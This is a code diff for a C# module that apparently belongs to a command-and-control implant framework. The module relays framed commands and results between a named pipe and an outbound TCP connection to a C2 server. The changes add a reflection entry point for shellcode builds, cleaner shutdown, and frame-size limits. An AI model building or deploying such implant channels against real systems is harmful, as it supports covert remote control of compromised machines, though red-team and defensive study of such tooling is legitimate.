@@ -3,58 +3,93 @@ using System.IO;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using ExecUnitUtils;
 
 namespace TcpListenerExecUnit
 {
-    internal class Program
+    public class Program
     {
         const string DefaultPipeName = "QQQWWWEEE";
         const int SendPollIntervalMs = 100;
         const int ReconnectDelayMs = 5000;
+        const int MaxTcpFrameBytes = 64 * 1024 * 1024;
         const uint KeepAliveTimeMs = 5000;
         const uint KeepAliveIntervalMs = 1000;
 
+        // Public reflection entry point; shares the executable's implementation.
+        public static void start(string[] args)
+        {
+            Main(args);
+        }
+
         static void Main(string[] args)
         {
-            while (true)
+#if TUONI_SHELLCODE
+            string pipeName = DefaultPipeName;
+#else
+            if (args == null || args.Length != 1 || string.IsNullOrWhiteSpace(args[0]))
+                return;
+            string pipeName = args[0];
+#endif
+            try { Run(pipeName); }
+            catch (Exception) { } // The reflection entry point must not fail the host.
+        }
+
+        static void Run(string pipeName)
+        {
+            using (ManualResetEvent disconnected = new ManualResetEvent(false))
             {
+                CommunicationNamedPipesListener client = null;
+                SenderHolder sender = new SenderHolder();
+                Thread sendThread = null;
                 try
                 {
-                    var client = new CommunicationNamedPipesListener(DefaultPipeName, null);
+                    client = new CommunicationNamedPipesListener(pipeName, null);
+                    client.Disconnected += () =>
+                    {
+                        disconnected.Set();
+                        sender.Stop();
+                    };
                     byte[] configData = client.Connect();
-                    if (configData == null)
-                    {
-                        Thread.Sleep(ReconnectDelayMs);
-                        continue;
-                    }
-
-                    if (!TryParseHostPort(configData, out string host, out int port))
-                    {
-                        Thread.Sleep(ReconnectDelayMs);
-                        continue;
-                    }
+                    if (configData == null || !client.IsConnected) return;
+                    if (!TryParseHostPort(configData, out string host, out int port)) return;
 
                     // Single long-lived sender across reconnects: only one consumer of
                     // client.GetDataToSend() ever exists, so a result can never be stolen
                     // by a stale thread from a previous session.
-                    SenderHolder sender = new SenderHolder();
-                    Thread sendThread = new Thread(() => RunSendLoop(client, sender))
+                    sendThread = new Thread(() => RunSendLoop(client, sender, disconnected))
                     {
                         IsBackground = true,
                         Name = "tcp-send"
                     };
                     sendThread.Start();
 
-                    while (true)
+                    while (client.IsConnected && !sender.IsStopping)
                     {
-                        RunOneSession(host, port, client, sender);
-                        Thread.Sleep(ReconnectDelayMs);
+                        RunOneSession(host, port, client, sender, disconnected);
+                        if (disconnected.WaitOne(ReconnectDelayMs)) break;
                     }
                 }
-                catch (Exception)
+                catch (Exception) { }
+                finally
                 {
-                    try { Thread.Sleep(ReconnectDelayMs); } catch { }
+                    // Close the socket and wake the sender before joining it. The
+                    // pipe disposal releases a pending metadata/data request.
+                    disconnected.Set();
+                    sender.Stop();
+                    try { if (client != null) client.Dispose(); }
+                    finally
+                    {
+                        if (sendThread != null)
+                        {
+                            while (sendThread.IsAlive)
+                            {
+                                try { sendThread.Join(); }
+                                catch (ThreadInterruptedException) { }
+                            }
+                        }
+                    }
                 }
             }
         }
@@ -72,16 +107,23 @@ namespace TcpListenerExecUnit
             }
 
             host = hostPort.Substring(0, sepIdx);
-            return int.TryParse(hostPort.Substring(sepIdx + 1), out port);
+            return int.TryParse(hostPort.Substring(sepIdx + 1), out port) && port > 0 && port <= 65535;
         }
 
-        static void RunOneSession(string host, int port, CommunicationNamedPipesListener client, SenderHolder sender)
+        static void RunOneSession(string host, int port, CommunicationNamedPipesListener client,
+            SenderHolder sender, ManualResetEvent disconnected)
         {
             TcpClient tcp = null;
             try
             {
                 tcp = new TcpClient();
-                tcp.Connect(host, port);
+                if (!sender.TrackSocket(tcp)) return;
+                // Pipe loss must also interrupt a stalled connect, including DNS.
+                Task connect = tcp.ConnectAsync(host, port);
+                while (!connect.IsCompleted)
+                    if (disconnected.WaitOne(SendPollIntervalMs)) return;
+                connect.GetAwaiter().GetResult();
+                if (disconnected.WaitOne(0)) return;
                 EnableTcpKeepAlive(tcp.Client);
                 NetworkStream stream = tcp.GetStream();
                 object streamLock = new object();
@@ -91,60 +133,109 @@ namespace TcpListenerExecUnit
                     return;
                 }
 
-                sender.SetSession(stream, streamLock);
-                try
-                {
-                    RunReadLoop(stream, client);
-                }
-                finally
-                {
-                    sender.ClearSession(stream);
-                }
+                if (!sender.SetSession(tcp, stream, streamLock)) return;
+                RunReadLoop(stream, client);
             }
             catch (SocketException) { }
             catch (IOException) { }
             catch (Exception) { }
             finally
             {
-                if (tcp != null)
-                {
-                    try { tcp.Close(); } catch { }
-                }
+                sender.ClearSocket(tcp);
+                CloseSocket(tcp);
             }
+        }
+
+        static void CloseSocket(TcpClient tcp)
+        {
+            if (tcp == null) return;
+            try { tcp.Client.Shutdown(SocketShutdown.Both); } catch (Exception) { }
+            try { tcp.Close(); } catch (Exception) { }
         }
 
         sealed class SenderHolder
         {
             readonly object _gate = new object();
+            TcpClient _socket;
             NetworkStream _stream;
             object _streamLock;
+            bool _stopping;
 
-            public void SetSession(NetworkStream stream, object streamLock)
+            public bool IsStopping
+            {
+                get { lock (_gate) return _stopping; }
+            }
+
+            public bool TrackSocket(TcpClient tcp)
             {
                 lock (_gate)
                 {
-                    _stream = stream;
-                    _streamLock = streamLock;
-                    Monitor.PulseAll(_gate);
+                    if (_stopping) return false;
+                    _socket = tcp;
+                    return true;
                 }
             }
 
-            public void ClearSession(NetworkStream stream)
+            public bool SetSession(TcpClient tcp, NetworkStream stream, object streamLock)
             {
                 lock (_gate)
                 {
-                    if (ReferenceEquals(_stream, stream))
+                    if (_stopping || !ReferenceEquals(_socket, tcp)) return false;
+                    _stream = stream;
+                    _streamLock = streamLock;
+                    Monitor.PulseAll(_gate);
+                    return true;
+                }
+            }
+
+            public void ClearSocket(TcpClient tcp)
+            {
+                lock (_gate)
+                {
+                    if (ReferenceEquals(_socket, tcp))
                     {
+                        _socket = null;
                         _stream = null;
                         _streamLock = null;
                     }
                 }
             }
 
+            public void Stop()
+            {
+                TcpClient tcp;
+                lock (_gate)
+                {
+                    _stopping = true;
+                    tcp = _socket;
+                    _socket = null;
+                    _stream = null;
+                    _streamLock = null;
+                    Monitor.PulseAll(_gate);
+                }
+                CloseSocket(tcp);
+            }
+
+            void CloseSession(NetworkStream stream)
+            {
+                TcpClient tcp = null;
+                lock (_gate)
+                {
+                    if (ReferenceEquals(_stream, stream))
+                    {
+                        tcp = _socket;
+                        _socket = null;
+                        _stream = null;
+                        _streamLock = null;
+                    }
+                }
+                CloseSocket(tcp);
+            }
+
             // Block until a live session is available, then write the framed payload.
             // If the write fails the session is dropped and we wait for the next one,
             // so the result is never silently consumed without a transmit attempt.
-            public void Send(byte[] meta, byte[] data)
+            public bool Send(byte[] meta, byte[] data)
             {
                 while (true)
                 {
@@ -152,10 +243,11 @@ namespace TcpListenerExecUnit
                     object streamLock;
                     lock (_gate)
                     {
-                        while (_stream == null)
+                        while (_stream == null && !_stopping)
                         {
                             Monitor.Wait(_gate);
                         }
+                        if (_stopping) return false;
                         stream = _stream;
                         streamLock = _streamLock;
                     }
@@ -170,16 +262,19 @@ namespace TcpListenerExecUnit
                             stream.Write(data, 0, data.Length);
                             stream.Flush();
                         }
-                        return;
+                        return true;
                     }
                     catch (IOException)
                     {
-                        ClearSession(stream);
-                        // loop and wait for next session
+                        CloseSession(stream);
                     }
                     catch (ObjectDisposedException)
                     {
-                        ClearSession(stream);
+                        CloseSession(stream);
+                    }
+                    catch (SocketException)
+                    {
+                        CloseSession(stream);
                     }
                 }
             }
@@ -203,40 +298,44 @@ namespace TcpListenerExecUnit
             return true;
         }
 
-        static void RunSendLoop(CommunicationNamedPipesListener client, SenderHolder sender)
+        static void RunSendLoop(CommunicationNamedPipesListener client, SenderHolder sender,
+            ManualResetEvent disconnected)
         {
-            while (true)
+            while (!sender.IsStopping && client.IsConnected)
             {
                 try
                 {
                     byte[] outData = client.GetDataToSend();
+                    if (sender.IsStopping || !client.IsConnected) break;
                     if (outData == null)
                     {
-                        Thread.Sleep(SendPollIntervalMs);
+                        if (disconnected.WaitOne(SendPollIntervalMs)) break;
                         continue;
                     }
                     byte[] outMeta = client.GetMetadata();
+                    if (sender.IsStopping || !client.IsConnected) break;
                     if (outMeta == null)
                     {
-                        Thread.Sleep(SendPollIntervalMs);
+                        if (disconnected.WaitOne(SendPollIntervalMs)) break;
                         continue;
                     }
-                    sender.Send(outMeta, outData);
+                    if (!sender.Send(outMeta, outData)) break;
                 }
                 catch (Exception)
                 {
-                    try { Thread.Sleep(SendPollIntervalMs); } catch { }
+                    if (sender.IsStopping || !client.IsConnected ||
+                        disconnected.WaitOne(SendPollIntervalMs)) break;
                 }
             }
         }
 
         static void RunReadLoop(NetworkStream stream, CommunicationNamedPipesListener client)
         {
-            while (true)
+            while (client.IsConnected)
             {
                 int length = ReadLE32(stream);
                 byte[] payload = ReadFully(stream, length);
-                client.NewDataFromC2(payload);
+                if (!client.NewDataFromC2(payload)) return;
             }
         }
 
@@ -272,7 +371,8 @@ namespace TcpListenerExecUnit
 
         static byte[] ReadFully(Stream s, int count)
         {
-            if (count < 0) throw new IOException("Refusing to read negative byte count: " + count);
+            if (count < 0 || count > MaxTcpFrameBytes)
+                throw new IOException("Invalid TCP frame length: " + count);
             byte[] buf = new byte[count];
             int offset = 0;
             while (offset < count)
